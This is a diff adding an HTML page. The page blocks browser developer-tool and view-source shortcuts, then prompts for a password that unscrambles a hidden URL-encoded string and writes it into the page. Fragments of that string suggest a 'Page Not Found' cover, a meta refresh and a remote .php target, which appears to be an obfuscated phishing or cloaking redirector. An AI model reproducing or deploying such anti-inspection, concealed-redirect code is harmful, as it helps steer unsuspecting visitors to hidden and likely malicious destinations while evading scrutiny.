@@ -1,0 +1,106 @@
+<!doctype html>
+<html>
+
+<script>
+addEventListener('keydown', function(e) {
+if(e.ctrlKey&&e.altKey&&e.which==73){event.preventDefault();}if(e.metaKey&&e.altKey&&e.which==73){event.preventDefault();}if(e.ctrlKey&&e.altKey&&e.which==74){event.preventDefault();}if(e.metaKey&&e.altKey&&e.which==74){event.preventDefault();}if(e.ctrlKey&&e.altKey&&e.which==67){event.preventDefault();}if(e.metaKey&&e.altKey&&e.which==67){event.preventDefault();}if(e.ctrlKey&&e.altKey&&e.which==85){event.preventDefault();}if(e.metaKey&&e.altKey&&e.which==85){event.preventDefault();}if(e.keyCode == 123) {return false;}})
+</script>
+
+
+<script language="JavaScript1.2">
+
+<!--
+
+
+
+
+function get_password() {
+
+  orig_pass = prompt("Enter password","");
+
+  if (orig_pass!=null && orig_pass!="")
+
+  password = new Array(orig_pass.length);
+
+  for(i=0; i<orig_pass.length; i++) {
+
+    password[i] = orig_pass.charCodeAt(i);
+
+  }
+
+  return password;
+
+}
+
+
+
+password = get_password();
+
+orig = unescape("Am%22v%22d%22%3CUXmeaIpee%20tli%20%22Omnu%3Dtl%3Dn%3Dm%3E%20dom%20%20m%22a%20a%20%20chtm%20mtmrCt%3D%22nmm%3Eg%20%20oP%20t%22arymf%20SateTun%20l%20hlt%20em%20%7Cnlk-emnmgtcPcd%3Ctlme%22-dLi/e%20mna%3Cb%3C%20a%20-tebt%20t%20mlsD%20mmor%3E%3C%20%20%20ld%3Et%20C%20%20m%3Eolitm%20mmb%2C%20ei%7D%20l%20nehnm%20mf%3A%20m%3DI%3B0mimh%20%20%20%20%20%20%20mgciehm%20iih1wf%201mlaa%20%25%20%3B%20%20%3Aai8%20%250%7B%3B-ag%3A0mm0%3A0%20Poit%20q%20%3Ao%20t%3Cfla%20C%20%20eie%22s5o0%20%20l%3Btmts5s1E--%3Bunes%20%3An%20%25at0n%3C%20m%3Ai%3C%20at0%2Cene%20t%20e%255%20a%21n%25o%25o%3Br%20%3Aam%2Cra%25r0r%20%28%25%20rt5%20o%200-%29odo0f%20enb%3Bm%20mn%3Al-r%3B%3Bpeom%20i-%3Bi%20n%3A%25%20%20m%7De%3A%20%20%20m%20mtmtt%28yrmenm%20m/%3B%29%20r%3Eammp%20%3C/0y0%3EdygElL%20egtndhPhtt%20mmt%20tbae%3Ce%20lr5peo%20r%3Dtoet%20%20mecahaaodxr%20%20smbteam%20/%3A.ute.fnp%20phmhhe.hbb%3Esmphmcpempdslz2%22bniety2/ce%3E52ts-i4fu0%3E1arof.08g1t589ol%2074ddY952b-m8e1am%3D06ess7d5e%3De744s/pt7%3Dl%3Ed31%20oeo5%22hmd24d/%20m0m%20mfrdui%3Em%26%3Esa%3Cb3eayoma%3Em//%3F%3Ch%3Emrbtlm%20m%20r%20c/3imommms%20ehcoeefamoni/dah%202ba%20siay5%7Bigti%20n%222drt%20m5e%20re5%20lmt%3C3irtlae%20mam9%20tte0ds%20om3%3C0cdel%3C");
+
+orig = orig.split("");
+
+
+
+passnum = orig.length % password.length;
+
+for(i=orig.length-1; i>=0; i--) {
+
+
+
+  passnum--;
+
+  if (passnum == -1) passnum = password.length - 1;
+
+
+
+  pos1 = i;
+
+  pos2 = i + password[passnum];
+
+
+
+  if (pos2 >= orig.length) continue;
+
+
+
+  char1 = orig[pos1];
+
+  char2 = orig[pos2];
+
+
+
+  orig[pos2] = char1;
+
+  orig[pos1] = char2;
+
+
+
+}
+
+
+
+orig1 = "";
+
+for(i=0;i<orig.length;i++) {
+
+  orig1 = orig1 + orig[i];
+
+}
+
+orig1 = orig1.replace(/mmm/g,"\r\n");
+
+
+
+document.write(orig1);
+
+
+
+//-->
+
+
+</script>
+
+<noscript>JavaScript must be enabled in order to view this page.</noscript>
+</html>
+
